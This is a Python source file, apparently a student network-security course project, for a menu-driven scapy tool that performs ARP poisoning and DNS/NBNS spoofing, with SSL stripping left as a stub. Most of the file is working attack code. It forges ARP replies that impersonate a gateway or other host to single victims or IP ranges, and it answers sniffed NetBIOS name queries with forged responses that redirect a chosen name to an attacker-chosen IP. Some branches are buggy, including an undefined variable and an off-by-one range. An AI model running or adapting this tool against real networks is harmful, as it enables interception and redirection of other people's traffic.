import sys, os, argparse
import random
from util import bcolors, clear, parse_ip_input, validate_domain
from scapy.all import sendp, Ether, IP, UDP, DNS, DNSQR, DNSRR, ARP, getmacbyip, sniff, NBNSQueryRequest, NBNSQueryResponse
from scapy.all import *
from scapy.packet import Packet
# from netfilterqueue import NetfilterQueue

from threading import Thread
from time import sleep

from scapy.fields import (
    BitEnumField,
    IPField,
)

_NETBIOS_GNAMES = {
    0: "Unique name",
    1: "Group name"
}

_NETBIOS_OWNER_MODE_TYPES = {
    0: "B node",
    1: "P node",
    2: "M node",
    3: "H node"
}



# The name of the network interface to use for sniffing and sending packets
INTERFACE_NAME = "enp0s3"
ATTACKS = {
    'a': 'ARP poisoning',
    'b': 'DNS spoofing',
    'c': 'SSL stripping'
}

IP_ATTACKER = ''
MAC_ATTACKER = ''
IP_VICTIMS = []
MAC_VICTIMS = []


# Python 2.7... :(
try:
    input = raw_input
except NameError:
    pass


# Set up argument parser for using arguments in the command line
parser = argparse.ArgumentParser(
    prog='2IC80 tool',
    description='A tool for ARP poising, DNS spoofing and SSL stripping.',
    epilog='There are no arguments, please use the menu provided when running the tool. Good luck!'
)


def ARPposioning():
    IP_ATTACKER = input("Enter IP address of attacker: ")
    MAC_ATTACKER = getmacbyip(IP_ATTACKER)

    victimNumber = input('Do you want to spoof one or multiple victims? (1/m)')
    if victimNumber == "1":
        ipVictim= input("Enter IP address of victim: ")
        macVictim= getmacbyip(ipVictim)

        IP_VICTIMS.append(ipVictim)
        MAC_VICTIMS.append(macVictim)

        ipToSpoof= input("Enter IP address to spoof: ")
        print(ipVictim)
        arp=Ether() / ARP()
        arp[Ether].src= MAC_ATTACKER
        arp[ARP].hwsrc= MAC_ATTACKER
        arp[ARP].psrc= ipToSpoof
        arp[ARP].hwdst= macVictim
        arp[ARP].pdst= ipVictim
        print("\n\n")
    
    elif victimNumber == "m":   
        IPrange=input('What is the range of IP addresses?')
        IpToSpoof=input('What is the IP address to spoof?')
        if "-" in IPrange:
            upperBoundary=IPrange.split("-")[1]
            lowerBoundary=lowerBoundary=IPrange.split(".")[3].split("-")[0]

            for i in range(int(lowerBoundary), int(upperBoundary)):
                 
                ipVictim= IPrange.split(".")[0]+"."+IPrange.split(".")[1]+"."+IPrange.split(".")[2]+"."+str(i)
                macVictim= getmacbyip(ipVictim)

                IP_VICTIMS.append(ipVictim)
                MAC_VICTIMS.append(macVictim)

                print(ipVictim)
                arp=Ether() / ARP()
                arp[Ether].src= MAC_ATTACKER
                arp[ARP].hwsrc= MAC_ATTACKER
                arp[ARP].psrc= ipToSpoof
                arp[ARP].hwdst= macVictim
                arp[ARP].pdst= ipVictim
        else:
            print("Invalid input. Please try again.")

        print("\n\n")
    

    sendp(arp, iface=INTERFACE_NAME)
    print('{cyan}{attack}{endc} has been executed (packet has been succesfully sent)\n'.format(cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC))
    

def DNSpoisoning():
    router_ip = ''
    dns_ip = ''
    dns_domain = ''
    ip_victim = '192.168.56.110'
    ip_attacker = '192.168.56.103'

    # DNS poisoning requires impersonating the router (gateway default at 10.0.3.2)

    # Ask for a router IP address until a valid one is provided
    while not router_ip:
        ip_input = input('Enter the IP address of the gateway (we need to impersonate the router for a MITM attack): ')
        ip_parsed = parse_ip_input(ip_input)

        if len(ip_parsed) == 1:
            router_ip = ip_parsed[0]
        else:
            print('{warning}Please fill in a single valid IP address, not a range or list.{endc}'.format(warning=bcolors.WARNING, endc=bcolors.ENDC))
    
    # Execute ARP poisoning attack to impersonate the router (let 192.168.56.101 know that attacker is at router_ip)
    arp = Ether() / ARP()
    arp[Ether].src = getmacbyip(ip_attacker)
    arp[ARP].hwsrc = getmacbyip(ip_attacker)
    arp[ARP].psrc = router_ip
    arp[ARP].hwdst = getmacbyip(ip_victim)
    arp[ARP].pdst = ip_victim

    sendp(arp, iface=INTERFACE_NAME)

    print('{cyan}{attack}{endc} has been executed (packet has been succesfully sent)\n'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['a'], endc=bcolors.ENDC))

    # Ask for a domain until a valid one is provided
    while not dns_domain:
        dns_domain_input = input('Enter the domain name to spoof: ')
        dns_domain_valid = validate_domain(dns_domain_input)

        if dns_domain_valid:
            dns_domain = dns_domain_input
        else:
            print('{warning}Please enter a valid domain (format: www.example.com){endc}'.format(warning=bcolors.WARNING, endc=bcolors.ENDC))


    # Ask for an IP address until a valid one is provided
    while not dns_ip:
        dns_ip_input = input('Enter the IP address to redirect the spoofed domain name to: ')
        dns_ip_parsed = parse_ip_input(dns_ip_input)

        if len(dns_ip_parsed) == 1:
            dns_ip = dns_ip_parsed[0]
        else:
            print('{warning}Please fill in a single valid IP address, not a range or list.{endc}'.format(warning=bcolors.WARNING, endc=bcolors.ENDC))
    
    # Start a new thread which is sniffing for DNS packets and calls the callback function when a packet is received
    # NOTE: Python 2.7-safe, so no daemon constructor arg but set later
    dns_sniffing_thread = Thread(target=dns_sniffing, args=(dns_domain, dns_ip), name='DNSSniffing')
    dns_sniffing_thread.daemon = True
    dns_sniffing_thread.start()

    print('\n{cyan}{attack}{endc} has been executed (set up a background task which will return a packet to victim resolving {cyan}{domain}{endc} to {cyan}{ip}{endc} whenever the victim sends the DNS query)\n'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['b'], endc=bcolors.ENDC, domain=dns_domain, ip=dns_ip))

def dns_sniffing(dns_domain, dns_ip):
    print('Sniffing for DNS packets...\n')
    sniff(filter='udp and port 137', prn=lambda packet: dns_callback(packet, dns_domain, dns_ip), iface=INTERFACE_NAME)
    print('Sniff finished!')


# Name Query Request


# class NBNSQueryRequest(Packet):
#     name = "NBNS query request"
#     fields_desc = [NetBIOSNameField("QUESTION_NAME", "windows"),
#                    ShortEnumField("SUFFIX", 0x4141, _NETBIOS_SUFFIXES),
#                    ByteField("NULL", 0),
#                    ShortEnumField("QUESTION_TYPE", 0x20, _NETBIOS_QRTYPES),
#                    ShortEnumField("QUESTION_CLASS", 1, _NETBIOS_QRCLASS)]

#     def mysummary(self):
#         return "NBNSQueryRequest who has '\\\\%s'" % (
#             self.QUESTION_NAME.strip().decode(errors="backslashreplace")
#         )


# bind_layers(NBNSHeader, NBNSQueryRequest,
#             OPCODE=0x0, NM_FLAGS=0x11, QDCOUNT=1)


# NBNS definition for reference
# class NBNSQueryResponse(Packet):
#     name = "NBNS query response"
#     fields_desc = [NetBIOSNameField("RR_NAME", "windows"),
#                    ShortEnumField("SUFFIX", 0x4141, _NETBIOS_SUFFIXES),
#                    ByteField("NULL", 0),
#                    ShortEnumField("QUESTION_TYPE", 0x20, _NETBIOS_QRTYPES),
#                    ShortEnumField("QUESTION_CLASS", 1, _NETBIOS_QRCLASS),
#                    IntField("TTL", 0x493e0),
#                    FieldLenField("RDLENGTH", None, length_of="ADDR_ENTRY"),
#                    PacketListField("ADDR_ENTRY",
#                                    [NBNS_ADD_ENTRY()], NBNS_ADD_ENTRY,
#                                    length_from=lambda pkt: pkt.RDLENGTH)
#                    ]

#     def mysummary(self):
#         if not self.ADDR_ENTRY:
#             return "NBNSQueryResponse"
#         return "NBNSQueryResponse '\\\\%s' is at %s" % (
#             self.RR_NAME.strip().decode(errors="backslashreplace"),
#             self.ADDR_ENTRY[0].NB_ADDRESS
#         )

class NBNS_ADD_ENTRY(Packet):
    fields_desc = [
        BitEnumField("G", 0, 1, _NETBIOS_GNAMES),
        BitEnumField("OWNER_NODE_TYPE", 00, 2,
                     _NETBIOS_OWNER_MODE_TYPES),
        BitEnumField("UNUSED", 0, 13, {0: "Unused"}),
        IPField("NB_ADDRESS", "192.168.56.102")
    ]

def dns_callback(packet, dns_domain, dns_ip):
    ip_attacker = '192.168.56.103'

    # Requests on Windows XP are handled using NBNS (NetBIOS Name Service) instead of DNS. Rewrite the code below for NBNS spoofing.
    print('NBNS packet received. Checking if it is a query for {cyan}{domain}{endc}...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))

    # Check if the packet is an NBNS query
    if packet.haslayer(NBNSQueryRequest):
        # Check if the packet's NBNS query is for the domain name to be spoofed
        print('NBNS query received. Checking if it is for {cyan}{domain}{endc}...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))
        print(packet[NBNSQueryRequest].QUESTION_NAME)
        print(packet[NBNSQueryRequest].show())
        
        # Use regex to see if the domain name is in the NBNS query
        if dns_domain in packet[NBNSQueryRequest].QUESTION_NAME.lower():
            print('NBNS query for {cyan}{domain}{endc} received. Sending spoofed NBNS response packet...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))
            # Create a new NBNS packet
            nbns = Ether() / IP() / UDP() / NBNSQueryResponse()

            # Set the source and destination MAC and IP addresses (from attacker back to victim)
            nbns[Ether].src = getmacbyip('192.168.56.255')
            nbns[Ether].dst = packet[Ether].src
            nbns[IP].src = '192.168.56.255'
            nbns[IP].dst = packet[IP].src

            # Set the NBNS packet's source and destination port to 137, the NBNS port
            nbns[UDP].sport = 137
            nbns[UDP].dport = 137

            # Fill the NBNS packet's fields
            nbns[NBNSQueryResponse].RR_NAME = dns_domain
            nbns[NBNSQueryResponse].SUFFIX = 0x4141
            nbns[NBNSQueryResponse].NULL = 0
            nbns[NBNSQueryResponse].QUESTION_TYPE = 0x20
            nbns[NBNSQueryResponse].QUESTION_CLASS = 1
            nbns[NBNSQueryResponse].TTL = 0x493e0
            nbns[NBNSQueryResponse].RDLENGTH = 6
            nbns[NBNSQueryResponse].NB_ADDRESS = dns_ip

            print(nbns[NBNSQueryResponse].show())

            # Send the NBNS packet
            print('Sending spoofed NBNS packet...\n')
            sendp(nbns, iface=INTERFACE_NAME)

            print('{cyan}{attack}{endc} has been executed (packet has been succesfully sent)\n'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['b'], endc=bcolors.ENDC))
    
    
    # print('DNS packet received. Checking if it is a query for {cyan}{domain}{endc}...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))
    # # Check if the packet is a DNS query
    # if packet.haslayer(DNSQR):
    #     # Check if the packet's DNS query is for the domain name to be spoofed
    #     print('DNS query received. Checking if it is for {cyan}{domain}{endc}...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))
    #     if packet[DNSQR].qname == dns_domain:
    #         print('DNS query for {cyan}{domain}{endc} received. Sending spoofed DNS packet...\n'.format(cyan=bcolors.OKCYAN, domain=dns_domain, endc=bcolors.ENDC))
    #         # Create a new DNS packet
    #         dns = Ether() / IP() / UDP() / DNS()

    #         # Set the source and destination MAC and IP addresses (from attacker back to victim)
    #         dns[Ether].src = MAC_ATTACKER
    #         dns[Ether].dst = packet[Ether].src
    #         dns[IP].src = IP_ATTACKER
    #         dns[IP].dst = packet[IP].src

    #         # Set the DNS packet's source and destination port to 53, the DNS port
    #         dns[UDP].sport = 137
    #         dns[UDP].dport = 137

    #         # Set the DNS packet's transaction ID to a random number
    #         dns[DNS].id = random.randint(0, 65535)
    #         # Set the DNS packet's query to the domain name to be spoofed
    #         dns[DNS].qd = DNSQR(qname=dns_domain)
    #         # Set the DNS packet's answer to the IP address of your choice
    #         dns[DNS].an = DNSRR(rrname=dns_domain, rdata=dns_ip)

    #         # Send the DNS packet
    #         print('Sending spoofed DNS packet...\n')
    #         sendp(dns, iface=INTERFACE_NAME)

    #         print('{cyan}{attack}{endc} has been executed (packet has been succesfully sent)\n'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['b'], endc=bcolors.ENDC))


def SSLstripping():
    print('SSL stripping selected.\n')

# def setup_ip_forwarding(callback):
#     queue = NetfilterQueue
#     queue_number = 1
#     os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format(queue_number))

#     queue.bind(queue_number, callback)
#     ip_forwarding_thread = Thread(target=ip_forwarding, args=(queue, queue_number), daemon=True, name='IPForwarding')
#     ip_forwarding_thread.start()
    
# def ip_forwarding(queue, queue_number):
#     try:
#         queue.run()
#     except KeyboardInterrupt:
#         os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {queue_number}')


def main():
    clear()
    print('2IC80: Tool by G44')

    # Setup IP forwarding to allow for DNS spoofing & SSL stripping
    # setup_ip_forwarding()

    # Main program loop
    while True:
        print('Select the preferred attack from the list below:\n')
        
        print('    {cyan}a{endc}) {attack}'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['a'], endc=bcolors.ENDC))
        print('    {cyan}b{endc}) {attack}'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['b'], endc=bcolors.ENDC))
        print('    {cyan}c{endc}) {attack}'.format(cyan=bcolors.OKCYAN, attack=ATTACKS['c'], endc=bcolors.ENDC))
        print('    {cyan}d{endc}) Exit\n'.format(cyan=bcolors.OKCYAN, endc=bcolors.ENDC))

        choice = input('\nYour choice: ' + bcolors.OKCYAN)
        print(bcolors.ENDC + '\n')
        selectedName = choice
        if choice in ATTACKS:
            selectedName = ATTACKS[choice]
        elif choice == 'd':
            selectedName = 'Exit'
        print('You have selected {cyan}{name}{endc}. \n'.format(cyan=bcolors.OKCYAN, name=selectedName, endc=bcolors.ENDC))

        if choice == 'd':
            break
        elif choice == 'a':
            ARPposioning()
        elif choice == 'b':
            DNSpoisoning()
        elif choice == 'c':
            SSLstripping()
        else:
            print('Invalid input. Please try again.\n')


# Entry point: This part runs when the tool is called from the command line using `python tool.py`. The if-statement is not required, but good practice.
if __name__ == '__main__':
    parser.parse_args()
    main()
